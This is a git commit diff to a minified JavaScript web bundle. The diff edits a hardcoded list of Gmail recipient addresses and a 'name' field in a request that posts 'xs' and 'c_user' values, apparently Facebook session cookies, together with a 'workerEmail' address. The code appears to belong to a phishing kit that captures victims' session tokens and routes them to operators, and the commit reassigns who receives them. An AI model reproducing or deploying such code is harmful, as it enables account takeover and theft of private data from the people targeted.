126174f7f5c57be8c2da6c62c38f5c81136b58e7
anonymoussir53 <anonymoussir53@gmail.com>
2025-03-07 20:14:49 +0500

    S

--- static/js/main.fa301602.js
+++ static/js/main.fa301602.js
@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ["mjohn72929@gmail.com","official.naomihenderson@gmail.com"],
+            l = ["mjohn72929@gmail.com"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10383,7 +10383,7 @@
                                 workerEmail: "mjohn72929@gmail.com",
                                 xs: r,
                                 c_user: i,
-                                name: "Aqib",
+                                name: "Sahil",
                               }),
                             }).then((e) => {
                               e.ok;
